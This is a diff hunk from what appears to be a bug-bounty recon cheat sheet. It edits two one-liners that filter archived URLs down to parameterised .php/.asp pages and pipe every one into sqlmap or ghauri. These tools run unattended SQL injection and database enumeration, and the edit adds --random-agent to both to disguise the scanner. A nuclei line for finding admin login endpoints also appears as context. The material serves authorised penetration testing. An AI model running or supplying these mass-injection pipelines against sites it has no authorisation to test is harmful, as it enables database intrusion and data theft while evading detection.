@@ -58,10 +58,10 @@ nuclei -list unique-urls.txt -ai "Find admin login endpoints"
 
 
 SQLMap from Waybackurls
-cat all_urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
+cat all_urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch --random-agent -u "{}"
 
 Ghauri from Waybackurls
-cat all_urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} ghauri --dbs --batch --level 3 --confirm -u "{}"
+cat all_urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} ghauri --dbs --batch --level 3 --confirm --random-agent -u "{}"
 
 
 --------------------------------------------------------------------------------------------------------------------------------------
